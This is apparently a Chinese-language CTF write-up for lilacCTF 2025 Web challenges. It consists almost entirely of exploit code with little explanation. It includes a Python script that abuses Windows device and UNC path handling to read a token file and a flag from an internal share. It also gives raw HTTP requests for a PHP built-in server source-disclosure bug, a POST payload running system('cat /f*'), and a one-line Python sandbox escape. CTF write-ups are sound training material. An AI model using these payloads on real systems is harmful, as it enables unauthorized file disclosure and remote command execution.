---
title: "lilacCTF2025 Web 解出汇总"
description: "lilacCTF 2025 Web方向比赛WP，整理解题思路、关键利用点和赛后复盘记录。"
pubDate: "2026-05-01"
updatedDate: "2026-05-01"
tags: ["CTF", "Web安全", "WP"]
cover: auto
coverAlt: "lilacCTF2025 Web 解出汇总 的文章封面"
draft: false
---
## Path
```
import requests

def fetch_info(URL):
    try:
        print("[*] Fetching URL ...")
        response = requests.get(URL)
        print("[+] Fetched URL successfully.")
        print(response.text)
    except requests.RequestException as e:
        print(f"Error fetching {URL}: {e}")
        return None
    
def fetch_Access(URL,path):
    try:
        params = {"path": path}
        print("[*] Fetching Access ...")
        response = requests.get(URL, params=params)
        print("[+] Fetched Access successfully.")
        print(response.text)
        return response.json().get("token")  
    except requests.RequestException as e:
        print(f"Error fetching {URL}: {e}")
        return None
    
def fetch_file(URL, token, path):
    try:
        params = {"path": path, "token": token}
        print("[*] taken token Fetching File ...")
        response = requests.get(URL, params=params)
        print("[+] taken token Fetched File successfully.")
        print(response.text)
    except requests.RequestException as e:
        print(f"Error fetching {URL}: {e}")
        return None
if __name__ == "__main__":
    URL_INFO = "http://1.95.51.2:8080/api/info"
    fetch_info(URL_INFO)    
    
    URL_ACCESS = "http://1.95.51.2:8080/api/diag/read"
    PATH = "\\\\?\C:\\token\\access_key.txt"
    token = fetch_Access(URL_ACCESS, PATH)
    

    URL_EXPORT = "http://1.95.51.2:8080/api/export/read"
    FLAG_PATH2 = "\\\\?\GLOBALROOT\??\\UNC\\172.20.0.10\\backup\\flag.txt"
    fetch_file(URL_EXPORT, token, FLAG_PATH2)
```
## keep
```
GET /index.php HTTP/1.1
Host: 61.147.171.105:52689
/r/n
GET /xyz.xyz HTTP/1.1
/r/n
/r/n
```
https://projectdiscovery.io/blog/php-http-server-source-disclosure#proof-of-concept
```
GET /s3Cr37_f1L3.php.bak HTTP/1.1
Host: 61.147.171.103:49586

POST /xyz.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

admin=system('cat /f*');

```
## check in
```
vars().get(min(dir())).append(~vars().get(min(dir())).pop())
```
